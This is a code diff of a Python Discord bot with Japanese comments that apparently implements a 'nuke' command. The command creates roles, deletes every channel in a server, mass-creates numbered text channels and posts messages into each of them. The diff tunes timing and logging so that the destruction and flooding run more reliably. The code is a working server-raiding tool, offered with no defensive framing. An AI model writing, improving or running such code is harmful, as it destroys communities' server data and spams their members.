@@ -1,10 +1,8 @@
-# main.py（順序保証・確実版 nuke）
+# main.py（削除後待機で確実版 nuke）
 import os
 import asyncio
 import logging
 from datetime import datetime
-import json
-
 import discord
 from discord.ext import commands
 from flask import Flask, jsonify
@@ -83,7 +81,7 @@ async def nuke(ctx):
             logger.exception(f"ロール作成失敗: {e}")
         await asyncio.sleep(0.05)
 
-    # 2. チャンネル削除
+    # 2. 全チャンネル削除
     await ctx.send("🧹 全チャンネルを削除...")
     channels_to_delete = [c for c in guild.channels]
     for c in channels_to_delete:
@@ -93,11 +91,11 @@ async def nuke(ctx):
             logger.exception(f"チャンネル削除失敗: {e}")
         await asyncio.sleep(0.05)
 
-    # 削除完了後に少し待機
-    await asyncio.sleep(1)
+    # 削除完了後に長めに待機
+    await asyncio.sleep(3)
 
     # 3. チャンネル作成
-    await ctx.send(f"🆕 テキストチャンネルを {CHANNEL_COUNT} 個作成...")
+    await ctx.send(f"🆕 チャンネルを {CHANNEL_COUNT} 個作成...")
     created_channels = []
     for i in range(1, CHANNEL_COUNT + 1):
         name = f"{CHANNEL_BASE}-{i}"
@@ -105,7 +103,7 @@ async def nuke(ctx):
             ch = await guild.create_text_channel(name)
             created_channels.append(ch)
         except Exception as e:
-            logger.exception(f"チャンネル作成失敗: {e}")
+            logger.exception(f"チャンネル作成失敗: {name}: {e}")
         await asyncio.sleep(0.3)
 
     # 4. メッセージ送信
@@ -115,7 +113,7 @@ async def nuke(ctx):
             try:
                 await ch.send(msg)
             except Exception as e:
-                logger.exception(f"メッセージ送信失敗: {ch.name}: {e}")
+                logger.exception(f"メッセージ送信失敗 ({ch.name}): {e}")
             await asyncio.sleep(0.05)
         await asyncio.sleep(0.03)
 
